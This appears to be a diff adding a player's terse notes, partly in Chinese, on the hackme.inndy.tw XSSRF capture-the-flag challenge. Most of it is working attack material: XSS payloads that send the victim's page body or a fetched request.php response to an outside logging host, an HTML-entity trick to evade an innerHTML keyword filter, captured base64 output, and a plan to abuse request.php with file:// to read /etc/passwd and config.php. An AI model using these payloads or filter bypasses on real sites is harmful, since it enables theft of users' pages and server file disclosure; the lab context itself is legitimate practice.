@@ -1,0 +1,57 @@
+=========================================
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+btoa(document.body&#41;">
+http://guui9d.ceye.io/W29iamVjdCBIVE1MQm9keUVsZW1lbnRd
+[object HTMLBodyElement] 
+
+=========================================
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+btoa(document.body.innerHTML&#41;">
+Bad words found: innerhtml
+
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+btoa(document.body.&#105;nnerHTML&#41;">
+
+http://guui9d.ceye.io/CjxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLWxnIG5hdmJhci1kYXJrIGJnLWRhcmsgZC1mbGV4Ij4KICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSJpbmRleC5waHAiPlhTU1JGPC9hPgoKICA8dWwgY2xhc3M9Im5hdmJhci1uYXYiPgogICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0ic2VuZG1haWwucGhwIj5TZW5kIE1haWw8L2E+CiAgICA8L2xpPgogICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0ibWFpbGJveC5waHAiPk1haWxib3g8L2E+CiAgICA8L2xpPgogICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0ic2VudG1haWwucGhwIj5TZW50IE1haWw8L2E+CiAgICA8L2xpPgogICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0ic2V0YWRtaW4ucGhwIj5TZXQgQWRtaW48L2E+CiAgICA8L2xpPgogICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0icmVxdWVzdC5waHAiPlNlbmQgUmVxdWVzdDwvYT4KICAgIDwvbGk+CiAgPC91bD4KCiAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1sLWF1dG8iPgogICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdGV4dCI+SGVsbG8sIGFkbWluIChBZG1pbmlzdHJhdG9yKTwvc3Bhbj4KICAgIDwvbGk+CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJsb2dvdXQucGhwIj5Mb2dvdXQ8L2E+CiAgICA8L2xpPgogIDwvdWw+CjwvbmF2PgoKICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIHRleHQtd2hpdGUgYmctZGFyayI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgIDxoMiBjbGFzcz0iY2FyZC10aXRsZSI+CiAgICAgICAgICAgIDExMTEgICAgICAgICAgPC9oMj4KICAgICAgICAgIDxoND5Gcm9tOiA8YSBocmVmPSJzZW5kbWFpbC5waHA/dG89aW5uZHkiPmlubmR5PC9hPjwvaDQ+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXRleHQiPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIAoK
+=========================================
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        document.location='http://guui9d.ceye.io/'+btoa(xmlhttp.responseText.substr(0,500));
+    }
+}
+xmlhttp.open('GET','request.php',true);
+xmlhttp.send();
+
+<body/onpageshow="&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#61;&#110;&#101;&#119;&#32;&#88;&#77;&#76;&#72;&#116;&#116;&#112;&#82;&#101;&#113;&#117;&#101;&#115;&#116;&#40;&#41;&#59;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#111;&#110;&#114;&#101;&#97;&#100;&#121;&#115;&#116;&#97;&#116;&#101;&#99;&#104;&#97;&#110;&#103;&#101;&#61;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#10;&#123;&#10;&#32;&#32;&#32;&#32;&#105;&#102;&#32;&#40;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#114;&#101;&#97;&#100;&#121;&#83;&#116;&#97;&#116;&#101;&#61;&#61;&#52;&#32;&#38;&#38;&#32;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#115;&#116;&#97;&#116;&#117;&#115;&#61;&#61;&#50;&#48;&#48;&#41;&#10;&#32;&#32;&#32;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#103;&#117;&#117;&#105;&#57;&#100;&#46;&#99;&#101;&#121;&#101;&#46;&#105;&#111;&#47;&#39;&#43;&#98;&#116;&#111;&#97;&#40;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#84;&#101;&#120;&#116;&#46;&#115;&#117;&#98;&#115;&#116;&#114;&#40;&#48;&#44;&#53;&#48;&#48;&#41;&#41;&#59;&#10;&#32;&#32;&#32;&#32;&#125;&#10;&#125;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#111;&#112;&#101;&#110;&#40;&#39;&#71;&#69;&#84;&#39;&#44;&#39;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#112;&#104;&#112;&#39;&#44;&#116;&#114;&#117;&#101;&#41;&#59;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#115;&#101;&#110;&#100;&#40;&#41;&#59;">
+
+http://guui9d.ceye.io/PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5YU1NSRiAtIFNlbmQgTWFpbDwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImJvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzdHlsZS5jc3MiIG1lZGlhPSJhbGwiPgogICAgPHN0eWxlPmNvZGUua2V5d29yZCB7IGJvcmRlcjogMXB4IHNvbGlkICMzMzM7IHBhZGRpbmc6IDAgMnB4OyBtYXJnaW46IDAgMnB4OyBib3JkZXItcmFkaXVzOiAzcHg7IHdoaXRlLXNwYWNlOiBwcmU7IH08L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctZGFyayBkLWZsZXgiPgogIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9ImluZGV4LnBocCI+WFM=	
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>XSSRF - Send Mail</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="style.css" media="all">
+    <style>code.keyword { border: 1px solid #333; padding: 0 2px; margin: 0 2px; border-radius: 3px; white-space: pre; }</style>
+  </head>
+  <body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+  <a class="navbar-brand" href="index.php">XS 
+
+=========================================
+下载到setadmin 页面内容
+可以修改用户为admin权限
+重新登陆后
+Admin only allowed from localhost, but you came from 192.168.123.1
+=========================================
+https://xssrf.hackme.inndy.tw/robots.txt
+User-agent: *
+Disallow: /config.php
+Disallow: /you/cant/read/config.php/can/you?
+Disallow: /backup.zip
+=========================================
+利用request.php
+可以读取本地文件
+file:///etc/passwd
+file:///var/www/html/config.php
